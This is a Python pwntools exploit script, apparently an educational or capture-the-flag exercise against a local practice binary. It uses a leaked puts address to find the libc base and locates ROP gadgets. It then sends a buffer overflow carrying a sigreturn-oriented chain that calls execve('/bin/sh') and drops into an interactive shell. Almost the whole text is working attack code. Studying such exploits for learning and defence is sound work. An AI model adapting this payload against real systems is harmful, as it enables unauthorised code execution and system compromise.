#!/bin/python3

from pwn import process, gdb, p64, context
from pwn import ELF, ROP, SigreturnFrame
from sys import argv

# needed for SigreturnFrame to work properly, I really should have this in
#   all my other scripts, but oh well c:
context.arch = 'amd64'

p = gdb.debug('./a.out', gdbscript="""
    b *main
    continue
""") if len(argv) > 1 else process('./a.out')

elf = ELF('./a.out')
libc = elf.libc

p.recvuntil(b'puts: ')
puts_leak = int(p.recvuntil(b'\n'), 16)

p.recvuntil(b'buf: ')
buf_leak = int(p.recvuntil(b'\n'), 16)

# Can calculate libc base address from this information
libc_base = puts_leak - libc.sym['puts']


"""

Finding useful gadgets for later

"""

libc_rop = ROP(libc)

# Using some slightly different gadgets this time
pop_rax_ret = libc_base + libc_rop.find_gadget(['pop rax', 'ret'])[0]
syscall_ret = libc_base + libc_rop.find_gadget(['syscall', 'ret'])[0]
libc.address = libc_base


"""

Step 1: Format the sigreturn frame

"""

sigframe = SigreturnFrame()
sigframe.rdi = next(libc.search(b'/bin/sh'))  # /bin/sh string
sigframe.rsi = 0                              # NULL
sigframe.rdx = 0                              # NULL
sigframe.rip = libc.sym['execve']             # execve


"""

Step 2: Do an rt_sigreturn syscall, and pass the sigreturn frame

"""

chain = p64(pop_rax_ret) \
    + p64(0xf)           \
    + p64(syscall_ret)
payload = b'i' * 0x58 + chain + bytes(sigframe)
p.sendline(payload)


# Enjoy the shell c:
p.interactive()
